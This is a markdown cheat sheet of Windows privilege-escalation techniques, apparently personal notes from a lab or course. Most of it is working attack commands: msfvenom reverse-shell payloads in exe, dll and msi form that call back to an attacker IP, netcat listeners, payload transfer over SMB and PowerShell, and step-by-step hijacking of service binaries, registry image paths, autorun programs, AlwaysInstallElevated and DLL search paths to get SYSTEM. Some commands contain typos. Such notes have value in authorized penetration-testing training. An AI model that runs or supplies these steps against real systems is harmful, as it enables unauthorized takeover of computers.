# Windows Privilege Escalation

## Reverse Shell

### Creating a Reverse Shell Executable (.exe)
```bash

-p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o reverse.exe
```
### Transfering Shell
- Through SMB
kali terminal 1
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
kali terminal 2
```bash
sudo nc -nvlp 8133
```
windows
```
copy \\10.13.47.80\kali\reverse.exe C:\PrivEsc\reverse.exe

C:\PrivEsc\reverse.exe
```

- Through Powershell wget
kali terminal 1
```bash
python -m SimpleHTTPServer 4444
```
kali terminal 2
```
sudo nc -nvlp 8133
```
windows
```
powershell -c wget "http://10.13.47.80:4444/reverse.exe" -outfile "C:\PrivEsc\reverse.exe"

C:\PrivEsc\reverse.exe
```

### Administrator Shell Through RDP
windows
```
net localgroup administrators <username> /add
```

### Local Admin to SYSTEM
Use PsExec64.exe
```
./PsExec64.exe -accepteula -i -s C:/PrivEsc/reverse.exe
```

## Enumeration Tools
- PowerUp.ps1
```bash
powershell -exec bypass

. .\PowerUp.ps1
Invoke-AllChecks
```

- SharpUp.exe
```
.\SharpUp.exe
```
- Seatbelt (alot outputs, does not search for privesc vectors for you)
```
.\Seatbelt.exe all
```
- WINpeas.exe (most powerful)
allow colors (Alternatively, reverse shell from kali should show colour as well)
```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
open new cmd
```
.\winPEAS.exe
```
## Service Exploit
- Note that you need to have permission to start and stop service for this to work
### Important Services Commands
- Query configurations of service
```
sc qc <svc name>
```
- Query current status of service
```
sc query <svc name>
```
- Modify an option in the servce
```
sc config <svc name> <option>= <value>
# note that it is <option>=<space><value>
```
- Start/stop a service
```
sc start/stop <svc name>
net start/stop <svc name>
```
### 5 Types of Misconfigurations
1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permission
4. Insecure Service Executables
5. DLL Hijacking

### Insecure Service Properties
1. Check winpeas under ```interesting services - non microsoft``` and see if there is any one of it states that ```you can modify this service```
2. You can verify it again in winpeas under ```modifiable services``` section
3. You can further verify it with ```accesschk.exe``` and see if you have ```SERVICE_CHANGE_CONFIG``` with this command
```
.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
```
4. See where does the binary path point to with ```sc qc <svc name>```
5. see if you need to start/stop the service ```sc query <svc name>```
6. change binary path to location of our reverse shell
```
sc config <svc name> binpath= "\"C:\Privesc\reverse.exe\""
```
7. setup ```nc``` and start the service with ```net start <svc name>```

### Unquoted Service Path
- Example if ```C:\Program File\Some Dir\unquoted.exe``` is unquoted.
- In theory windows is looking for ```C:\Program.exe``` or ```C:\Program File\Some.exe``` or ```C:\Program File\Some Dir\unquoted.exe```
- Without quotes windows do not know if it is a program with arguments or direct path.
1. Check winpeas under grey text ```Unquoted Path Service```
2. Check if you have permission to start and stop the services 
```
.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
```
3. Check for write permission for each directory path 
```
.\accesschk.exe /accepteula -uwdq <PC username> <dir name> 
```
4. Rename and put reverse shell in editable directory.
5. setup netcat and run service

### Weak Registry Permission
1. Check winpeas under ``` looking if you can modify any service registry```
2. Use powershell or accesschk to check for permissions
```
powershell -exec bypass

Get-Acl <svc reg directory> | Format-List
```
```
.\accesschk.exe /accepteula -uvwqk <PC username> <dir name> 
```
3. note that the ```NT AUTHORITY/INTERACTIVE``` have full control of the reg ```RW```.
4. check if you can start the svc
```
.\accesschk.exe /accepteula -uwcqv <PC username> <svc name> 
```
5. Check the image path with ```sc query <svc name>```
6. Change the img path
```
reg add <path to svc reg> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
7. Run netcat and start service

### Insecure Service Executables
1. Check winpeas for file permission writeable to you or everyone under ```Interesting Services - non mircosoft```.
2. Verify with accesschk
```
.\accesschk.exe /accepteula -quvw <PC username> <dir name.exe> 
```
3. Make a backup of the original exe
```
copy <dir name.exe> C:\Temp
```
4. Overwrite original exe with our reverse shell
```
copy /Y C:\PrivEsc\reverse.exe <dir name.exe>
```
5. Setup netcat and start the service.

### DDL Hijacking
1. Check winpeas for DDL Hijacking writable path and see if anf write permssion folder is inside. ```Checking write permission in Path Folder (DLL Hijacking)``` section.
2. Enumerate all services in ```Interesting Services - non mircosoft``` to see which one has start and stop access.
```
.\accesschk.exe /accepteula -uvqc <PC username> <svc name> 
```
3. check if it runs with SYSTEM priv ```sc qc <svc name>```
4. copy this file to tester's come for analysis
5. Run ```procmon64.exe``` with admin rights
6. Use procmon to capture activities in computer (refer to ti3brus udemy course)
7. look for name not found dll
8. generate dll reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f dll -o reverse.dll
```
9. put dll in writeable folder
10. start netcat and start svc

## Registry Exploit

### For exe
1. Check winpeas under ```Autorun Application``` section
2. Look for a autorun application that anyone can write to.
3. To do it manually for step 1 and 2
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Run this for each output
.\accesschk.exe /accepteula -wvu <filename.exe>
```
4. Backup original .exe
5. Overwrite original .exe with our reverse.exe
6. setup up netcat and restart windows
- Note windows 10 will run application based on last logged out user.

### For msi
1. Check winpeas under ```Checking AlwaysInstalledElevated``` 
2. Make sure both local Machine (HKLM) and user (HKCU) has ```AlwaysInstalledElevated``` on the Installer path set to 1.
3. Manual query these 2 line:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstalledElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstalledElevated
```
4 Generate reverse shell with msfvenom
```
msfvenom -p -windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f msi -o game.msi
```
5. Copy the msi applications to target server
6. setup netcat and Run the msi
```
msiexec /quiet /qn /i reverse.msi

```

## Kernel Exploit (Last resort)
### Tools
1. Windows Exploit Suggester (wes)
2. Precompiled Kernel Exploits
3. Watson (For more recent Windows version)
### Technique
- See if ```systeminfo``` results show older unpatched windows and find relevant exploit for it.

1. Run ```systeminfo > \\10.13.47.80\kali\systeminfo.txt``` on the windows terminal to transfer systeminfo to kali SMB.
2. Run this in kali terminal
```
python wes.py /kali/systeminfo.txt -i 'Elevation of Privilege' --exploit-only | more
```
3. Cross reference all the CVE results with the Precompiled Kernel Exploits list.
4. If cant find, go search in exploit-db

